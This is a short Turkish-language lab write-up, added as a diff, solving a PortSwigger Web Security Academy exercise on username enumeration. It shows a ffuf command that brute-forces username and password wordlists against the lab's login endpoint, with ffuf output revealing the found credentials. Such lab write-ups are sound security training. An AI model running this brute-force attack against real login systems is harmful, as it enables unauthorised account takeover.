@@ -1,0 +1,40 @@
+Lab: Username enumeration via subtly different responses
+url: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses
+
+Analiz:
+    -- Sisteme ve lab açıklamasına ilk bakışımızda bruteforce olduğu anlaşılıyor.
+    -- Yapmamız gereken tek şet Lab_1/rapor.txt yolumuzdaki çözümü bu laba uyarlamak.
+
+Çözüm:
+
+ffuf -w username.txt:W1 -w password.txt:W2 -X POST -d "username=W1&password=W2" -u https://0a8e00160401744d89e64693000e0030.web-security-academy.net/login -H "Cookie: session=rC2M0s3L8R5xXgkbxrkp5DgCcq9E3rx9" -mc 302
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : https://0a8e00160401744d89e64693000e0030.web-security-academy.net/login
+ :: Wordlist         : W1: /home/erdem/GitHub/Broken Authentication/Lab_4/username.txt
+ :: Wordlist         : W2: /home/erdem/GitHub/Broken Authentication/Lab_4/password.txt
+ :: Header           : Cookie: session=rC2M0s3L8R5xXgkbxrkp5DgCcq9E3rx9
+ :: Data             : username=W1&password=W2
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 302
+________________________________________________
+
+[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 139ms]
+    * W1: arlington
+    * W2: 123123
+
+Sonuç: Lab tamamlandı.
